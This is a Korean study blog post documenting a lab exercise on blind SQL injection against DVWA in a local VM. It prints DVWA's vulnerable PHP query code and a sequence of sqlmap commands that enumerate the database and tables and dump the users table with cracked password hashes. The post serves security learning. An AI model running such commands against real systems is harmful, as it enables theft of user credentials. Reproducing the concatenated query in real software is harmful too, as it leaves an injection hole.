# Groot Security Study - Week 7

## DVWA의 내용들에 대해 직접 실습하고 그에 대한 보고서를 정리하는 블로그

### 개요
  7주차 역시 SQL Injection 공격에 관한 내용이다. 지난 주차의 SQL Injection과 큰 틀은 같지만 이번엔 쿼리문의 조회 결과를 반환할때 해당 데이터의 값이 아닌 존재 여부만 반환한다는 점이 다르다.
  <center><img src="/assets/230706/SQL_Injection_Diagram.png" width="50%" height="50%" alt="SQL_Injection_Diagram"></center><br/>
  21년도 조사에서는 순위가 조금 낮아졌으나, 이전까지 OWASP top 10 목록에서 1위를 놓치지 않던, 공격 난이도에 비해 파급력이 큰 공격이다.<br/>
  실습은 DVWA를 이용 하였으며, 실습 환경은 작성자의 가상머신에서 이루어졌다(ARM / VMWare Fusion - Kali Linux)<br/>

### 본론
**실습과정**
  1. Low
      우선 소스코드를 확인해 보면

      ```php
      <?php
      if( isset( $_GET[ 'Submit' ] ) ) {
        // Get input
        $id = $_GET[ 'id' ];
        $exists = false;

        switch ($_DVWA['SQLI_DB']) {
          case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

            $exists = false;
            if ($result !== false) {
                try {
                    $exists = (mysqli_num_rows( $result ) > 0);
                } catch(Exception $e) {
                    $exists = false;
                }
            }
            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;
          case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            try {
                $results = $sqlite_db_connection->query($query);
                $row = $results->fetchArray();
                $exists = $row !== false;
            } catch(Exception $e) {
                $exists = false;
            }

            break;
        }

        if ($exists) {
          // Feedback for end user
          echo '<pre>User ID exists in the database.</pre>';
        } else {
          // User wasn't found, so the page wasn't!
          header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

          // Feedback for end user
          echo '<pre>User ID is MISSING from the database.</pre>';
        }

      }
      ?> 
      ```

      코드를 보면 지난 주차의 SQL Injection과 유사하나, 차이점이 있다면 입력된 id값으로 쿼리문 조회를 수행하여 결과가 한개 이상 나오면 "ID가 존재합니다."가 출력되고 그렇지 않다면 "해당 ID는 존재하지 않습니다"가 뜬다. 그리고 만약 입력된 값으로 쿼리문을 완성했을때 적절한 쿼리문이 구성되지 않는다면 오류가 발생한 것으로 판단한다.(mysqli_query()함수 부분)<br/>
      실제로 확인했을때 1을 값으로 넣어보면 다음과 같은 결과를 확인해 볼 수 있다.<br/>
      <img src="/assets/230706/230706_screenshot_1.png" width="50%" height="50%" alt="Low_test"><br/><br/>
      그래서 생각해 낸 아이디어가 UNION문을 사용하여 다른 쿼리문을 묶어서 사용하는 것이었지만, 결국 어떤 쿼리문을 입력해도 조회되는 결과값이 하나 이상이면 '조회 성공'이 출력되는 방식이기에 다른 방법이 필요하다는 것을 알았다.<br/><br/>
      그래서 칼리 리눅스에 탑재되어 있는 sqlmap을 사용하기로 했다.(이 툴에 대한건 다른 포스트로 업로드 예정)
      <br/><br/>
      우선 burpsuite에서 인터셉트를 활성화 한 후 확인하려는 user id로 1을 제출하면 다음과 같은 정보를 확인할 수 있다.<br/>
      <img src="/assets/230706/230706_screenshot_2.png" width="50%" height="50%" alt="Low_test"><br/><br/>
      해당 내용을 텍스트 파일로 저장한 후, 다음과 같은 명령으로 sqlmap을 실행해 보았다.

      ```
      sqlmap -r request.txt
      ```

      <img src="/assets/230706/230706_screenshot_3.png" width="50%" height="50%" alt="Low_test"><br/><br/>
      위 사진을 보면, 해당 명령의 수행 결과로 id의 값을 받는 부분이 취약점을 가진다는 것과 해당 데이터베이스에 관련한 정보를 알 수 있다. 해당 취약점을 통해 공격을 수행하기 위해, 우선 현재 데이터베이스 이름을 알아야 한다. 따라서 다음 명령을 입력해 데이터베이스 이름을 조회하면, 그 이름이 dvwa로 설정되어 있는것을 알 수 있다.

      ```
      sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=2bpnk6a3t0vclp21lhjg0qvj43" --current-db
      ```
      
      <img src="/assets/230706/230706_screenshot_4.png" width="50%" height="50%" alt="Low_test"><br/><br/>
      그 다음, 필요한 데이터를 담고 있는 테이블을 알아내기 위해 데이터베이스 내부에 존재하는 테이블을 탐색해보았다.

      ```
      sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=2bpnk6a3t0vclp21lhjg0qvj43" -D dvwa --tables
      ```

      <img src="/assets/230706/230706_screenshot_5.png" width="50%" height="50%" alt="Low_test"><br/><br/>
      우리가 원하는 데이터는 사용자 정보이기에 users 테이블을 조회하면 원하는 데이터를 얻을 수 있을것으로 보인다. 따라서 덤프를 얻기 위해 다음과 같은 명령을 통해 덤프의 조회를 진행한다.

      ```
      sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=2bpnk6a3t0vclp21lhjg0qvj43" -D dvwa -T users --dump
      ```

      <img src="/assets/230706/230706_screenshot_6.png" width="100%" height="100%" alt="Low_test"><br/><br/>
      그 결과 위의 사진과 같이 사용자들의 이름 정보와 패스워드의 해시값을 크랙한 결과를 확인할 수 있다.

### 결론
  **원인 분석 & 예상 대응 방안**
  * 본문의 내용 중 sqlmap으로 취약점을 탐색하는 과정에서 매개변수인 id를 통해서 조회하려는 값을 전달받는 것이 취약점을 가지고 그 방법으로 여러 sql 조회 명령어를 추가하는 방식이 안내되어 있는데, 지난 주차의 일반적인 SQL Injection과 마찬가지로 입력값과 방식을 제한할 필요가 있어보인다. (조회 결과가 보이지 않을 뿐이지 데이터베이스 조회 방식은 같은것으로 보인다.)

### 마치며
  * 항상 칼리 리눅스 내부에 미리 설치된 여러가질 해킬 툴들을 보면서 '이렇게 많은 툴들을 다 쓰기는 할까?' 싶었는데, 이번 주차 실습을 진행하면서 평소에 쓰던 burpsuite 이외에 다른 툴을 처음으로 써 보았다. 이 많은 툴들을 다 써본적이 있는 사람이라면 정말 다양한 내용을 공부해 보았을거라 생각하니 대단한것 같다. (물론 대부분은 다 써보지도 못하겠지?)

### 참조
  * [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  * [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
  * [Database Dump](https://en.wikipedia.org/wiki/Database_dump)
  * [SQLMAP 사용법](https://eliez3r.github.io/post/2019/10/25/study-db-sqlmap.html)